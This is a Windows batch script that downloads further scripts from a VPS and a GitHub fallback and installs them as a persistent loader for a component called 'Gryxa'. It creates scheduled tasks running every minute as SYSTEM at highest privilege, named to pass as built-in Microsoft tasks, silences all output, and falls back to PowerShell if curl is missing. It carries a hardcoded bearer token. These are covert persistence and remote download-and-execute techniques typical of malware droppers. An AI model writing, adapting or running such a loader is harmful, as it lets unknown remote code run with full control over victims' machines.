@echo off
rem WINRTCS_QUICK Q3 - minimal installer + immediate Gryxa attempt.
rem Q2 (C23): dual-URL fetch (VPS primary + bearer, GitHub fallback) with curl --fail.
rem Q3 (C26): after arming Agent/Guard tasks, fetch winrtcs_guard.cmd, force the guard
rem   gate (guard.cnt=9999), clear a stale overlap lock, and launch guard DETACHED so
rem   Gryxa install starts within minutes of first landing - not after the 1-3h stagger.
rem   Real curl only (>1KB); hollow 0-byte curl.exe falls back to PowerShell WebClient.
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "CURL=%SystemRoot%\System32\curl.exe"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "BASE2=https://debian.seczio.com/winrtcs"
set "TOK=fe7e8f3b8af479870248be10ca25410b8e1bf9a5"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
call :QFetch winrtcs_run.cmd "%ZD%\winrtcs_run.cmd"
call :QFetch winrtcs_agent.cmd "%ZD%\winrtcs_agent.cmd"
if not exist "%ZD%\winrtcs_agent.cmd" ( echo FAIL agent-download & endlocal & exit /b 1 )
findstr /C:"WINRTCS_AGENT" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
if errorlevel 1 ( del /f /q "%ZD%\winrtcs_agent.cmd" >nul 2>&1 & echo FAIL agent-bad & endlocal & exit /b 2 )
findstr /C:"WINRTCS_RUN" "%ZD%\winrtcs_run.cmd" >nul 2>&1
if errorlevel 1 ( del /f /q "%ZD%\winrtcs_run.cmd" >nul 2>&1 & echo FAIL run-bad & endlocal & exit /b 3 )
set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
schtasks /Create /TN "\Microsoft\Windows\WinRTCS\Agent" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\WinRTCS\Guard" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1

rem --- C26: force first Gryxa health cycle now (do not wait for the 180-tick stagger) ---
call :QFetch winrtcs_guard.cmd "%ZD%\winrtcs_guard.cmd"
if exist "%ZD%\winrtcs_guard.cmd" (
  findstr /C:"WINRTCS_GUARD" "%ZD%\winrtcs_guard.cmd" >nul 2>&1
  if not errorlevel 1 (
    >"%ZD%\guard.cnt" echo 9999
    >"%ZD%\gryxa_boost.cnt" echo 15
    rmdir /s /q "%ZD%\guard.lockd" >nul 2>&1
    start "" /min cmd.exe /c "%ZD%\winrtcs_guard.cmd"
  )
)

schtasks /End /TN "\Microsoft\Windows\WinRTCS\Agent" >nul 2>&1
schtasks /Run /TN "\Microsoft\Windows\WinRTCS\Agent" >nul 2>&1
echo WINRTCS_QUICK=OK
endlocal & exit /b 0

:QFetch
rem %1 = repo file, %2 = dest. VPS then GitHub. Prefer real curl; else PowerShell.
del /f /q "%~2" >nul 2>&1
set "USECURL="
if exist "%CURL%" for %%C in ("%CURL%") do if %%~zC GTR 1000 set "USECURL=1"
if defined USECURL (
  "%CURL%" -f -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 6 --max-time 30 -o "%~2" "%BASE2%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
  if exist "%~2" for %%F in ("%~2") do if %%~zF GTR 10 exit /b 0
  "%CURL%" -f -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%~2" "%BASE%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
) else (
  "%PS%" -NoProfile -NonInteractive -Command "& { $ErrorActionPreference='Stop'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $w=New-Object Net.WebClient; $w.Headers.Add('Authorization','Bearer %TOK%'); try { $w.DownloadFile('%BASE2%/%~1','%~2') } catch { $w2=New-Object Net.WebClient; $w2.DownloadFile('%BASE%/%~1','%~2') } }" >nul 2>&1
)
if exist "%~2" for %%F in ("%~2") do if %%~zF GTR 10 exit /b 0
exit /b 1
